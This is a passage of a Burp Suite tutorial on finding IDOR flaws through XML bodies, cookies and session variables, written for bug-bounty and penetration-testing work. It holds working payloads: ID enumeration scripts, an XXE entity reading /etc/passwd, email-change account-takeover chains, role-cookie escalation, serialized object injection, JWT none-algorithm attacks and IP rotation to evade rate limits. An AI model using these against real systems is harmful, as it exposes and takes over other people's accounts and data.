✓ Show only in-scope items
✓ Filter by MIME type: XML
✓ Filter by extension: .xml, .asmx, .svc
```

### **Step 1.2: Spider for XML Endpoints**

**Using Burp Spider:**
```
Target → Site map → Right-click domain → Spider this host
Configuration:
- Maximum link depth: 3
- Maximum children: 500
- Check: "Request links in scope only"
```

**Using Burp Scanner (Passive):**
```
Target → Site map → Right-click → Passive Scan
Watch for: XML content type responses
```

### **Step 1.3: Parameter Discovery**

**Check Common XML Parameter Names:**
```xml
<!-- User identifiers -->
<id>123</id>
<userId>123</userId>
<user_id>123</user_id>
<accountId>123</accountId>
<profileId>123</profileId>

<!-- Document identifiers -->
<docId>456</docId>
<documentId>456</documentId>
<fileId>456</fileId>

<!-- Transaction identifiers -->
<orderId>789</orderId>
<transactionId>789</transactionId>
<paymentId>789</paymentId>
```

**Burp Intruder Setup for Parameter Discovery:**
```
1. Send request to Intruder
2. Positions → Clear §
3. Select entire XML body
4. Add wordlist of common parameter names
5. Attack type: Sniper
6. Payloads → Load parameter wordlist
```

---

## 🧪 **PHASE 2: BASELINE TESTING**

### **Step 2.1: Establish Normal Behavior**

**Capture Original Request:**
```xml
POST /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/xml
Authorization: Bearer your_token_here
Content-Length: 156

<?xml version="1.0" encoding="UTF-8"?>
<request>
    <action>viewProfile</action>
    <userId>1001</userId>
    <fields>
        <field>name</field>
        <field>email</field>
    </fields>
</request>
```

**Document Normal Response:**
```xml
HTTP/1.1 200 OK
Content-Type: application/xml

<?xml version="1.0"?>
<response>
    <status>success</status>
    <data>
        <name>John Doe</name>
        <email>john@example.com</email>
    </data>
</response>
```

### **Step 2.2: Create Baseline Map**

**Using Burp Comparer:**
```
1. Send multiple requests for your own ID (1001)
2. Send requests for non-existent ID (999999)
3. Send requests with invalid format
4. Compare responses to establish patterns
```

**Document Response Patterns:**
```python
# Create a response pattern map
Valid_own_200: "status>success</status"
Valid_own_content: Contains personal data
Invalid_ID_404: "status>error</status.*not found"
Invalid_format_400: "status>error</status.*invalid"
Unauthorized_403: "status>error</status.*unauthorized"
```

---

## 🔬 **PHASE 3: SYSTEMATIC ID TESTING**

### **Step 3.1: Sequential ID Testing**

**Burp Intruder Configuration:**
```
1. Send original XML request to Intruder
2. Positions → Highlight userId value (1001)
3. Click "Add §" to mark position
4. Attack type: Sniper

Payloads:
- Payload type: Numbers
- Number range: 1-2000
- Step: 1
- Number format: Decimal
```

**Intruder Settings:**
```
Resource Pool:
- Maximum concurrent requests: 5
- Throttle between requests: 200ms

Options:
- Grep - Match: ["success", "error", "unauthorized"]
- Grep - Extract: [Configure regex for user data]
- Store requests/responses: Yes
```

### **Step 3.2: Targeted ID Testing from Previous Findings**

**If you found valid IDs:**
```
1. Create custom wordlist from:
   - Public profiles
   - Error messages
   - API documentation
   - JavaScript files
   
2. Import wordlist into Intruder
3. Test each ID systematically
```

---

## 🎭 **PHASE 4: XML STRUCTURE MANIPULATION**

### **Step 4.1: Parameter Location Variations**

**Test Different XML Structures:**

**Original:**
```xml
<userId>1001</userId>
```

**Variation 1 - Nested deeper:**
```xml
<request>
    <user>
        <details>
            <id>1002</id>
        </details>
    </user>
</request>
```

**Variation 2 - Attribute instead of element:**
```xml
<user id="1002">
    <name>test</name>
</user>
```

**Variation 3 - Multiple parameters:**
```xml
<request>
    <userId>1002</userId>
    <userId>1001</userId>  <!-- Which one is used? -->
</request>
```

### **Step 4.2: XML Structure Fuzzing**

**Burp Intruder - Multiple Positions:**
```
1. Mark multiple potential ID locations:
   - <userId>§1001§</userId>
   - <user id="§1001§">
   - <id>§1001§</id>

2. Attack type: Pitchfork or Cluster bomb
3. Test different combinations
```

### **Step 4.3: XML Injection Techniques**

**Test for XML Parsing Behavior:**
```xml
<!-- Test 1: Comments -->
<userId>1001<!-- test --></userId>

<!-- Test 2: CDATA -->
<userId><![CDATA[1002]]></userId>

<!-- Test 3: Entities -->
<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<userId>&x;</userId>

<!-- Test 4: Namespace manipulation -->
<ns:userId xmlns:ns="http://target.com">1002</ns:userId>
```

---

## 🔄 **PHASE 5: ENCODING & FORMAT BYPASSES**

### **Step 5.1: Numeric Variations**

**Test with Burp Intruder - Numbers Payload:**
```
Original: 1001

Variations:
- 1001.0 (float)
- 01001 (leading zero)
- +1001 (positive sign)
- -1001 (negative - test if accepted)
- 1001%00 (null byte)
- 0x3E9 (hex)
- 01751 (octal)
- 1111101001 (binary)
```

### **Step 5.2: String Manipulations**

**If ID is string-based:**
```xml
<!-- Original -->
<username>john_doe</username>

<!-- Test variations -->
<username>admin</username>
<username>administrator</username>
<username>root</username>
<username>system</username>
<username>test%00</username>
<username>../john_doe</username>
```

### **Step 5.3: Encoding Tests**

**Create encoding payloads in Intruder:**
```python
# Payload processing rules:
1. URL encode: %31%30%30%31
2. Double URL encode: %2531%2530%2530%2531
3. HTML entities: &#49;&#48;&#48;&#49;
4. Unicode: \u0031\u0030\u0030\u0031
5. Base64: MTAwMQ==
```

---

## 📊 **PHASE 6: RESPONSE ANALYSIS**

### **Step 6.1: Automated Analysis with Burp**

**Configure Intruder Grep:**
```
Options → Grep - Match:
Add items:
- "John Doe" (your name)
- "success"
- "error"
- "unauthorized"
- "forbidden"
- "not found"
- "profile"
- "email"
```

**Configure Grep - Extract:**
```regex
# Extract user data
<name>(.*?)</name>
<email>(.*?)</email>
<id>(.*?)</id>
```

### **Step 6.2: Manual Response Analysis**

**Create Analysis Checklist:**
```markdown
For each successful ID (200 OK):
□ Does response contain other user's data?
□ Is any PII exposed? (email, phone, address)
□ Are there internal IDs exposed?
□ Can you perform actions on this data?
□ What's the authorization context?

Document findings:
ID: [tested_id]
Endpoint: [URL]
Original user: [your_id]
Accessed user: [found_user]
Data exposed: [list_fields]
Sensitive level: [High/Medium/Low]
```

### **Step 6.3: Response Time Analysis**

**Burp Intruder - Response Time:**
```
1. Add "Connection: close" header
2. Monitor response times
3. Look for anomalies:
   - Valid IDs: 200-300ms
   - Invalid IDs: 50-100ms
   - Timing differences may indicate valid IDs
```

---

## 🎯 **PHASE 7: EXPLOITATION & VERIFICATION**

### **Step 7.1: Manual Verification**

**For each promising finding:**
```xml
1. Log in as different user (if possible)
2. Capture their valid ID
3. Test cross-user access

Example scenario:
User A (ID: 1001) → Try accessing User B's data (ID: 1002)

Request:
POST /api/user/profile
<userId>1002</userId>

Response should NOT contain User B's data
```

### **Step 7.2: Exploit Chaining**

**Test for further impact:**
```xml
<!-- If read access works, test write access -->
<request>
    <action>updateProfile</action>
    <userId>1002</userId>
    <profile>
        <email>attacker@evil.com</email>
    </profile>
</request>
```

**Test for privilege escalation:**
```xml
<!-- Try accessing admin functions -->
<request>
    <action>admin_getAllUsers</action>
    <userId>1001</userId>  <!-- Your ID, but action is admin -->
</request>
```

### **Step 7.3: Business Logic Testing**

**Test real-world impact scenarios:**
```xml
Scenario 1: Order manipulation
POST /api/orders/view
<orderId>12345</orderId>  <!-- Someone else's order -->

Scenario 2: Password reset
POST /api/reset-password
<userId>1002</userId>  <!-- Trigger reset for other user -->

Scenario 3: Payment info
POST /api/payment/methods
<userId>1002</userId>  <!-- View others' payment methods -->
```

---

## 📝 **PHASE 8: DOCUMENTATION & REPORTING**

### **Step 8.1: Create Proof of Concept**

**Document each finding:**
```markdown
# IDOR Vulnerability Report

## Finding ID: IDOR-XML-001
**Endpoint:** POST /api/user/profile
**Parameter:** userId in XML body
**Original Value:** 1001 (current user)
**Tested Value:** 1002 (victim user)

## Request:
POST /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/xml
Authorization: Bearer [attacker_token]

<?xml version="1.0"?>
<request>
    <userId>1002</userId>
</request>

## Response:
HTTP/1.1 200 OK
[Include sanitized response showing victim data]

## Impact:
Unauthorized access to victim's:
- Full name
- Email address
- Phone number
- Home address

## CVSS Score: 7.5 (High)
Attack Vector: Network
Attack Complexity: Low
Privileges Required: Low
User Interaction: None
Scope: Unchanged
Confidentiality: High
Integrity: None
Availability: None
```

### **Step 8.2: Screenshot Evidence**

**Using Burp:**
```
1. Right-click request → Save item
2. Response → Right-click → Copy response to file
3. Use Burp's "Comparer" for before/after evidence
```

---

## 🛠️ **PHASE 9: ADVANCED BURP TECHNIQUES**

### **9.1: Using Burp Extender**

**Recommended Extensions:**
```python
1. **XML External Entity (XXE)**
   - Automatically tests for XXE in XML
   - Can help identify XML parsers

2. **Content Type Converter**
   - Convert between JSON/XML
   - Test if endpoint accepts both

3. **Turbo Intruder**
   - Faster scanning
   - Custom Python scripts
   - Example script:
```

**Turbo Intruder Script:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    
    for i in range(1, 1000):
        engine.queue(target.req, str(i))

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

### **9.2: Burp Macros for Authentication**

**Setup Macro:**
```
Project options → Sessions → Macros → Add
1. Record login sequence
2. Add token extraction rules
3. Link to session handling rules

This maintains session during scanning
```

---

## 🔍 **PHASE 10: TROUBLESHOOTING COMMON ISSUES**

### **Issue 1: Rate Limiting**

**Solutions:**
```
1. Add delays in Intruder:
   Resource pool → Delay between requests: 1000ms

2. Rotate IPs using:
   - VPN
   - Proxy chains
   - AWS Lambda rotation

3. Use Turbo Intruder with delays:
   time.sleep(1)
```

### **Issue 2: CSRF Tokens**

**Extract with Burp:**
```
1. Use session handling rules
2. Create macro to extract CSRF from XML
3. Apply to all requests

Example regex for CSRF in XML:
<csrfToken>(.*?)</csrfToken>
```

### **Issue 3: Complex XML Structures**

**Use XPath to locate elements:**
```xml
<!-- If structure varies -->
<envelope>
    <body>
        <getUser>
            <params>
                <id>1001</id>
            </params>
        </getUser>
    </body>
</envelope>

<!-- Test different XPath-like traversals -->
<id>1002</id>
<params><id>1002</id></params>
<getUser><id>1002</id></getUser>
```

---

## ✅ **FINAL CHECKLIST**

### **Testing Completion Checklist**
```
□ Identified all XML endpoints
□ Tested sequential IDs (1-1000)
□ Tested parameter location variations
□ Tested encoding bypasses
□ Tested XML structure manipulation
□ Analyzed all 200 OK responses
□ Manually verified findings
□ Documented proof of concepts
□ Checked for business logic impact
□ Tested write operations where applicable
□ Attempted privilege escalation
□ Verified with multiple user accounts
```

### **Reporting Checklist**
```
□ Clear vulnerability description
□ Step-by-step reproduction steps
□ Request/response evidence
□ Impact assessment
□ CVSS score
□ Remediation recommendations
□ Screenshots attached
□ No sensitive data in report
```

---

## 📚 **ADDITIONAL RESOURCES**

### **Burp Shortcuts for This Test**
```
Ctrl+R - Send to Repeater
Ctrl+I - Send to Intruder
Ctrl+F - Search responses
Ctrl+Shift+B - Toggle base64 decode
Ctrl+Shift+X - Send to Comparer
```

### **Common XML Namespaces to Test**
```xml
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
```

---

## ⚠️ **SAFETY NOTES**

1. **Always stay in scope**
2. **Don't modify critical data**
3. **Respect rate limits**
4. **Stop if you find PII**
5. **Report responsibly**
6. **Don't escalate without permission**
7. **Document everything**

---

## 🎯 **SUCCESS INDICATORS**

**You've found Bug #20 when:**
- ✅ Accessing userId=1002 returns different user's data
- ✅ You can enumerate valid user IDs
- ✅ XML parameter manipulation works
- ✅ Authorization checks are missing
- ✅ You can view/update other users' information

---

# 🎯 **Bug #21: Cookie Values IDOR - Complete Burp Suite Methodology**

## **What is Bug #21?**
IDOR vulnerability where object references are stored or passed through **cookie values** instead of URL parameters or POST bodies. This occurs when the application uses cookies to store user identifiers, resource IDs, or access tokens without proper authorization checks.

---

## 📊 **Cookie IDOR Attack Surface**

### **Common Cookie Names to Test**
```http
# User Identifiers
user_id
userId
uid
user
member_id
account_id
customer_id
profile_id

# Session/Resource Identifiers
session_id
cart_id
order_id
product_id
document_id
file_id
message_id
thread_id

# Application Specific
current_user
selected_profile
active_account
viewing_as
impersonate
debug_user
test_account
```

---

## 🔍 **Phase 1: Reconnaissance & Cookie Discovery**

### **Step 1: Map All Cookie Usages**

1. **Passive Cookie Collection**
```bash
# Burp Suite - Proxy History Filter
^Set-Cookie: | ^Cookie:
```

2. **Create Cookie Inventory**
```http
# Example Cookie Inventory Sheet
Cookie Name        | Domain       | Path | HttpOnly | Secure | SameSite | Value Pattern
------------------|--------------|------|----------|--------|----------|---------------
user_id           | app.com      | /    | No       | Yes    | Lax      | numeric(1-1000)
session_cart      | shop.com/cart| /cart| No       | No     | None     | uuid-v4
admin_debug       | admin.app.com| /admin| Yes     | Yes    | Strict   | base64
```

### **Step 2: Understand Cookie Flow**

```http
# Track Cookie Through Requests
1. Login Request → Server → Set-Cookie: user_id=100
2. Profile Request → Cookie: user_id=100 → Profile Data
3. Update Request → Cookie: user_id=100 → Update Operation
4. Logout → Cookie Cleared/Modified
```

---

## 🧪 **Phase 2: Manual Testing with Burp Suite**

### **Step 1: Capture Baseline Request**

```http
GET /api/profile HTTP/1.1
Host: example.com
Cookie: user_id=100; session=abc123
```

### **Step 2: Cookie Manipulation in Burp Repeater**

#### **A. Direct Value Modification**
```http
# Original
GET /api/profile HTTP/1.1
Cookie: user_id=100; session=abc123

# Modified - Try Increment
GET /api/profile HTTP/1.1
Cookie: user_id=101; session=abc123

# Modified - Try Decrement
GET /api/profile HTTP/1.1
Cookie: user_id=99; session=abc123

# Modified - Try Admin ID
GET /api/profile HTTP/1.1
Cookie: user_id=1; session=abc123
```

#### **B. Cookie Format Variations**
```http
# Different Formats for user_id=100
Cookie: user_id=100
Cookie: userId=100
Cookie: uid=100
Cookie: UID=100
Cookie: User-ID=100
Cookie: user.id=100
Cookie: user[id]=100
Cookie: user%5Fid=100  # URL encoded
Cookie: user_id="100"   # Quoted
Cookie: user_id='100'   # Single quoted
```

---

## 🤖 **Phase 3: Automated Testing with Burp Intruder**

### **Step 1: Configure Attack Positions**

```http
GET /api/profile HTTP/1.1
Host: example.com
Cookie: user_id=§100§; session=abc123
```

### **Step 2: Payload Sets**

#### **Payload Set 1: Numeric Enumeration**
```python
# Simple Range
1-1000
1000-2000
5000-6000

# Common IDs
1, 2, 10, 100, 500, 1000, 1337, 9999

# Admin/System IDs
0, -1, 1, 999, 10000, 99999

# Boundary Testing
2147483647  # Max int
4294967295  # Max unsigned int
9223372036854775807  # Max bigint
```

#### **Payload Set 2: UUID/GUID Patterns**
```python
# Sequential UUIDs
00000000-0000-0000-0000-000000000001
00000000-0000-0000-0000-000000000002

# Known patterns from logs
550e8400-e29b-41d4-a716-446655440000

# Null/Empty UUID
00000000-0000-0000-0000-000000000000
```

#### **Payload Set 3: Encoded Values**
```python
# Base64 encoded IDs
MTAw  # 100
MTAx  # 101
YWRtaW4=  # admin

# Hex encoded
0x64  # 100
0x65  # 101

# MD5 hashes (if IDs are hashed)
md5(100) = f899139df5e1059396431415e770c6dd
```

### **Step 3: Attack Configuration**

```python
# Intruder Attack Types
1. Sniper - Single position
2. Battering ram - Same payload all positions
3. Pitchfork - Different payload sets
4. Cluster bomb - Combinations
```

### **Step 4: Resource Pools**
```yaml
# Configure to avoid rate limiting
Pool Configuration:
  - Maximum concurrent requests: 5
  - Delay between requests: 200ms
  - Retry on failure: 2 times
  - Follow redirects: Never
```

---

## 🎯 **Phase 4: Advanced Cookie Manipulation**

### **Step 1: Cookie Deletion/Removal**

```http
# Test 1: Remove specific cookie
GET /api/profile HTTP/1.1
Cookie: session=abc123

# Test 2: Remove all cookies
GET /api/profile HTTP/1.1

# Test 3: Empty cookie values
GET /api/profile HTTP/1.1
Cookie: user_id=; session=abc123
```

### **Step 2: Cookie Cloning/Replay**

```http
# Get victim cookie via another method (if possible)
Cookie: user_id=101; session=xyz789

# Replay with your session
GET /api/profile HTTP/1.1
Cookie: user_id=101; session=abc123
```

### **Step 3: Cookie Parameter Pollution**

```http
# Multiple cookie headers
GET /api/profile HTTP/1.1
Cookie: user_id=100
Cookie: user_id=101

# Cookie with duplicate parameters
Cookie: user_id=100&user_id=101
Cookie: user_id[]=100&user_id[]=101
```

---

## 🔬 **Phase 5: Response Analysis Techniques**

### **Step 1: Status Code Analysis**

```python
# Intruder Grep - Match patterns
Status Codes:
  200 OK - Potential success
  403 Forbidden - Access denied but valid ID
  404 Not Found - Invalid ID or resource
  500 Internal Error - Possible injection
  302 Redirect - May leak info in Location
```

### **Step 2: Content Length Analysis**

```bash
# Sort responses by content length
# Different lengths often indicate valid/invalid IDs

Content Length Patterns:
  1250 bytes - Valid user profile
  450 bytes - "Access Denied" message
  230 bytes - "User not found" message
  1250 bytes - Different user's profile
```

### **Step 3: Response Time Analysis**

```python
# Timing Attacks
Response Times:
  Valid ID: 150ms
  Invalid ID: 50ms
  Admin ID: 500ms (more data)
```

### **Step 4: Error Message Analysis**

```http
# Look for information leaks
Response A: {"error": "User 100 not found"}
Response B: {"error": "Invalid permissions"}
Response C: {"profile": {"name": "John", "email": "..."}}
```

---

## 🛠️ **Phase 6: Burp Extensions for Cookie IDOR**

### **Essential Extensions**

1. **Cookie Editor**
```python
# Quick cookie modification
- Right-click request → Cookie Editor
- Modify values on the fly
- Save cookie sets for reuse
```

2. **AuthMatrix**
```python
# Test different user contexts
User A Cookie → User A Actions
User A Cookie → User B Actions
User B Cookie → User A Actions
```

3. **Autorize**
```python
# Automatic authorization testing
1. Set low-privilege cookie
2. Set high-privilege endpoints
3. Autorize tests automatically
```

### **Custom Extender Script**

```python
# Python script for cookie manipulation
from burp import IBurpExtender, IIntruderPayloadGenerator
import base64

class BurpExtender(IBurpExtender, IIntruderPayloadGenerator):
    def generatePayloads(self, base_value):
        # Generate cookie variations
        variations = []
        
        # Original value
        variations.append(base_value)
        
        # Increment/decrement
        if base_value.isdigit():
            val = int(base_value)
            variations.extend([str(val+i) for i in range(-10, 11)])
        
        # Encoded versions
        variations.append(base64.b64encode(base_value))
        variations.append(base64.b64encode(base_value).upper())
        
        # Hex encoding
        if base_value.isdigit():
            variations.append(hex(int(base_value)))
        
        return variations
```

---

## 🎭 **Phase 7: Context-Specific Testing**

### **Scenario 1: E-commerce Cart IDOR**

```http
# Test cart access via cookie
GET /cart/items HTTP/1.1
Cookie: cart_id=abc123; session=xyz789

# Intruder payloads
cart_id=§abc123§

# Check for:
- View other users' carts
- Add items to others' carts
- Modify quantities
- Apply discounts
- Checkout manipulation
```

### **Scenario 2: User Impersonation**

```http
# Admin impersonation cookie
GET /admin/users HTTP/1.1
Cookie: admin_session=xyz; user_id=§100§

# Payloads
1, 2, 3, ...  # Regular users
0, -1, 9999   # System accounts
"admin", "root", "superuser"  # Usernames
```

### **Scenario 3: Multi-tenant Applications**

```http
# Tenant switching via cookie
GET /api/dashboard HTTP/1.1
Cookie: tenant_id=§100§; user_id=500

# Check for cross-tenant access
- View other companies' data
- Modify other tenants' settings
- Access billing information
```

---

## 📈 **Phase 8: Advanced Exploitation Chains**

### **Chain 1: Cookie IDOR → Account Takeover**

```http
# Step 1: Find IDOR in profile update
POST /profile/update HTTP/1.1
Cookie: user_id=§100§
Content-Type: application/json

{"email":"attacker@evil.com"}

# Step 2: If user_id=101 updates user 101's email
# Step 3: Trigger password reset to new email
# Step 4: Takeover account
```

### **Chain 2: Cookie IDOR → Privilege Escalation**

```http
# Step 1: Find role cookie
Cookie: user_id=100; role=user; session=xyz

# Step 2: Modify role
Cookie: user_id=100; role=§admin§; session=xyz

# Step 3: Access admin functions
GET /admin/panel HTTP/1.1
Cookie: role=admin; session=xyz
```

---

## 🚨 **Phase 9: Detection Signatures**

### **Indicators of Cookie IDOR**

```yaml
Green Flags (Vulnerable):
  ✅ Different user data returned after cookie change
  ✅ Status code 200 for other users' IDs
  ✅ Response contains other users' PII
  ✅ No CSRF/anti-CSRF for cookie changes
  ✅ Rate limiting bypass possible

Red Flags (Protected):
  ❌ All requests return 403/401
  ❌ Session invalidated on cookie change
  ❌ Consistent error messages
  ❌ Rate limiting triggered
  ❌ CSRF tokens required
```

---

## 📝 **Phase 10: Reporting Template**

### **Bug Report Structure**

```markdown
# Title: IDOR via Cookie Manipulation in [Endpoint]

## Description
The application uses [cookie_name] to identify [resource/user] 
without proper authorization checks, allowing attackers to 
access/modify other users' data.

## Steps to Reproduce
1. Login as user A (ID: 100)
2. Capture request: [request details]
3. Modify cookie: [modification details]
4. Observe response: [response details]

## Proof of Concept
```http
Request:
GET /api/profile HTTP/1.1
Host: example.com
Cookie: user_id=101; session=abc123

Response:
HTTP/1.1 200 OK
{"name": "Victim User", "email": "victim@example.com"}
```

## Impact
- Unauthorized access to [n] users' data
- Potential account takeover
- Data breach severity

## Remediation
- Implement server-side authorization
- Use session-based user identification
- Add CSRF tokens for sensitive operations
- Implement rate limiting
```

---

## 🛡️ **Mitigation Testing**

### **Post-Fix Validation**

```http
# After fixes, test:
1. Cookie tampering returns 403
2. Session binding validated
3. Rate limiting active
4. Proper logging in place
5. No information leakage
```

---

## 📚 **Practice Labs for Cookie IDOR**

1. **PortSwigger Labs**
   - IDOR in cookie-based authentication
   - Multi-step IDOR with cookies

2. **PentesterLab**
   - Cookie manipulation exercises
   - Session fixation scenarios

3. **HackTheBox**
   - Machines with cookie-based IDOR
   - Real-world scenarios

---

## ⚠️ **Important Notes**

- **Authorization Required**: Always get written permission
- **Scope Limitations**: Stay within defined boundaries
- **Data Handling**: Never exfiltrate real user data
- **Reporting**: Report responsibly through proper channels
- **Documentation**: Keep detailed notes of all tests

---

# 🎯 **Bug #22: Session Variables IDOR - Full Burp Suite Methodology**

## **What is Bug #22?**
Testing IDOR vulnerabilities by modifying **Session Variables** and **Session-based References** - where object references are stored in or derived from session data.

---

## 📚 **TABLE OF CONTENTS**
1. [Understanding Session-Based IDOR](#understanding)
2. [Reconnaissance Phase](#reconnaissance)
3. [Burp Configuration](#configuration)
4. [Testing Methodology](#testing)
5. [Advanced Techniques](#advanced)
6. [Exploitation Scenarios](#exploitation)
7. [Reporting Template](#reporting)

---

## 🔍 **UNDERSTANDING SESSION-BASED IDOR** {#understanding}

### **What are Session Variables?**
Session variables are server-side or client-side data that maintain user state across requests:
- **Cookies** (PHPSESSID, JSESSIONID)
- **JWT Tokens** in localStorage/sessionStorage
- **Custom Headers** (X-User-ID, X-Session-Token)
- **Hidden Form Fields** with session data
- **URL Parameters** containing session references

### **How Session IDOR Works**
The application trusts session data for authorization without verifying:
- User A's session contains `user_id=100`
- Attacker modifies to `user_id=101`
- Server processes request for user 101

---

## 🕵️ **RECONNAISSANCE PHASE** {#reconnaissance}

### **Step 1: Map All Session Storage Locations**

#### **Using Burp's Inspector:**
1. Intercept a request after login
2. Go to **Inspector > Cookies** tab
3. Document all cookies:
```
PHPSESSID=abc123def456
user_preferences=eyJ1c2VySWQiOjEwMH0=
session_data=MTIzNDU2Nzg5
```

#### **Check Browser Storage (via Burp's Embedded Browser):**
```javascript
// Execute in Burp's browser console
console.log("=== Local Storage ===");
for(let i=0; i<localStorage.length; i++) {
    console.log(localStorage.key(i) + ": " + localStorage.getItem(localStorage.key(i)));
}

console.log("=== Session Storage ===");
for(let i=0; i<sessionStorage.length; i++) {
    console.log(sessionStorage.key(i) + ": " + sessionStorage.getItem(sessionStorage.key(i)));
}
```

### **Step 2: Identify Session-Based Parameters**

#### **Create Custom Intruder Payload for Parameter Discovery:**
1. Create a wordlist of common session parameters:
```
session
session_id
sessionid
sid
user_session
session_data
sessiontoken
sess_id
sessionKey
session_token
user_session_id
auth_session
session_key
sessionId
sessionID
SESSIONID
sessid
SESSID
sessionuser
session_user
session_user_id
current_session
active_session
```

2. **Burp Intruder Setup:**
   - Position payload at each parameter
   - Use **Sniper** attack
   - Grep for differences in response length/status

### **Step 3: Analyze Session Patterns**

#### **Create Session Map:**
```
Target: https://example.com

Session Storage Locations:
├── Cookies
│   ├── PHPSESSID (random 32-char)
│   ├── user_token (JWT format)
│   └── session_info (base64)
├── Local Storage
│   ├── user_preferences (JSON)
│   └── session_data (encrypted)
└── Custom Headers
    └── X-Session-ID (in API requests)
```

---

## ⚙️ **BURP CONFIGURATION** {#configuration}

### **Step 1: Install Required Extensions**

Go to **Extender > BApp Store** and install:

1. **Session Variable Analyzer** (Custom extension)
2. **JSON Web Tokens** - For JWT manipulation
3. **Custom Parameter Handler** - For automated testing
4. **Autorize** - For authorization checks
5. **Auth Analyzer** - Session analysis

### **Step 2: Configure Session Handling Rules**

**Navigate to: Project Options > Sessions > Session Handling Rules**

#### **Rule 1: Extract Session Variables**
```
Add Rule:
- Description: "Extract session variables from responses"
- Actions:
  - Check "Extract session variables from response"
  - Define regex patterns:
    - user_id["\s]*:[\s]*(\d+)
    - session_id["\s]*=[\s]*["']([^"']+)
    - data-user-id=["'](\d+)
```

#### **Rule 2: Session Variable Modification**
```
Add Rule:
- Description: "Auto-modify session variables"
- Scope: All tools
- Actions:
  - Check "Modify session variables"
  - Add custom modification rules
```

### **Step 3: Create Custom Session Tokens**

**Project Options > Sessions > Session Handling Rules > Add > Run a macro**

```yaml
Macro Steps:
1. Login request → Extract session token
2. Profile request → Extract user ID
3. Dashboard request → Extract session data
4. Store all in session variables
```

### **Step 4: Configure Match and Replace**

**Project Options > Match and Replace**

Add rules to automatically modify session values:

```
Add Rule:
- Type: Request header
- Match: ^(Cookie:.*)user_id=\d+(.*)$
- Replace: $1user_id=101$2
- Comment: "Auto-increment user_id in cookies"
```

---

## 🧪 **TESTING METHODOLOGY** {#testing}

### **Phase 1: Cookie-Based Session Variables**

#### **Technique 1: Direct Cookie Modification**

1. **Capture a request:**
```
GET /api/profile HTTP/1.1
Host: example.com
Cookie: session_id=abc123; user_id=100; user_role=user
```

2. **Send to Repeater**
3. **Modify user_id in cookie:**
```
Cookie: session_id=abc123; user_id=101; user_role=user
```

4. **Burp Repeater Setup:**
   - Create 10 tabs with incrementing user_id
   - Use **Send group in parallel** for efficiency

#### **Technique 2: Cookie Parameter Pollution**

```http
# Original
Cookie: session_id=abc123; user_id=100

# Test 1: Duplicate
Cookie: session_id=abc123; user_id=100; user_id=101

# Test 2: Array format
Cookie: session_id=abc123; user_id[]=100; user_id[]=101

# Test 3: Different case
Cookie: session_id=abc123; USER_ID=101
```

### **Phase 2: JWT Session Variables**

#### **Using Burp's JWT Extension:**

1. **Extract JWT from request:**
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDAsInJvbGUiOiJ1c2VyIn0.signature
```

2. **Right-click > Send to JWT Editor**

3. **Modify Payload:**
```json
{
  "user_id": 101,
  "role": "user"
}
```

4. **Test Signature Algorithms:**
   - None algorithm attack
   - HS256 → RS256 confusion
   - Key confusion attacks

### **Phase 3: Local/Session Storage**

#### **Methodology with Burp's Browser:**

1. **Open Burp's embedded browser**
2. **Navigate to application**
3. **Open Developer Tools** (F12)
4. **Go to Application tab > Storage**

```javascript
// Modify in console
localStorage.setItem('user_id', '101');
localStorage.setItem('userData', JSON.stringify({id: 101, name: 'victim'}));
sessionStorage.setItem('currentUser', '101');
```

5. **Refresh page and intercept request to see changes**

### **Phase 4: Hidden Form Fields**

#### **Using Burp Proxy:**

1. **Intercept form submission:**
```html
<form action="/update-profile">
    <input type="hidden" name="user_id" value="100">
    <input type="text" name="email">
</form>
```

2. **Modify in Burp:**
```
POST /update-profile HTTP/1.1
...
user_id=101&email=attacker@evil.com
```

#### **Automated Testing with Intruder:**

```
Payload positions:
- user_id=§100§
- session_user=§100§
- uid=§100§

Payloads: Numbers 1-200, 1000-1100, 9999-10000
```

---

## 🚀 **ADVANCED TECHNIQUES** {#advanced}

### **Technique 1: Session Fixation via IDOR**

#### **Steps in Burp:**

1. **Create two user sessions** (User A and User B)

2. **Capture User A's session cookie:**
```
Cookie: PHPSESSID=aaaaaa; user_id=100
```

3. **Attempt to set User B's session with User A's ID:**
```
# In User B's session, modify:
Cookie: PHPSESSID=bbbbbb; user_id=100
```

4. **Use Burp Repeater with Group Input:**
   - Tab 1: User A session
   - Tab 2: User B session with modified user_id
   - Compare responses

### **Technique 2: Session Data Deserialization**

#### **Identify serialized session data:**

```php
# Look for patterns in cookies
s:7:"user_id";i:100;
O:8:"UserData":2:{s:7:"user_id";i:100;s:8:"username";s:5:"admin";}
```

#### **Burp Intruder for Object Injection:**
```
Position: cookie_value=§serialized_data§

Payloads:
- O:8:"UserData":2:{s:7:"user_id";i:101;s:8:"username";s:5:"admin";}
- O:8:"UserData":2:{s:7:"user_id";i:100;s:8:"username";s:7:"attacker";}
- O:8:"UserData":2:{s:7:"user_id";i:999;s:8:"username";s:4:"root";}
```

### **Technique 3: Session Race Conditions**

#### **Using Burp Turbo Intruder:**

```python
# Turbo Intruder script for race conditions
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=100,
                           pipeline=False)

    # First request - normal session
    engine.queue(target.req)
    
    # Race condition - modify session mid-request
    for i in range(50):
        engine.queue(target.req, gate='race1')
    
    engine.openGate('race1')
    engine.start()

def handleResponse(req, interesting):
    if 'user 101' in req.response:
        table.add(req)
```

### **Technique 4: Session Token Brute-Force**

#### **Burp Intruder Setup:**
```
Attack type: Pitchfork

Position 1: session_token=§token§
Position 2: user_id=§user§

Payload set 1: Generated tokens (wordlist)
Payload set 2: Numbers 100-200

Resource pool: Maximum concurrent requests
```

### **Technique 5: Custom Headers Session Bypass**

#### **Test common session headers:**
```
X-Original-User-ID: 101
X-Forwarded-User: 101
X-User-ID: 101
X-Proxy-User-ID: 101
X-Authenticated-User: 101
X-Impersonate: 101
X-Original-User: 101
```

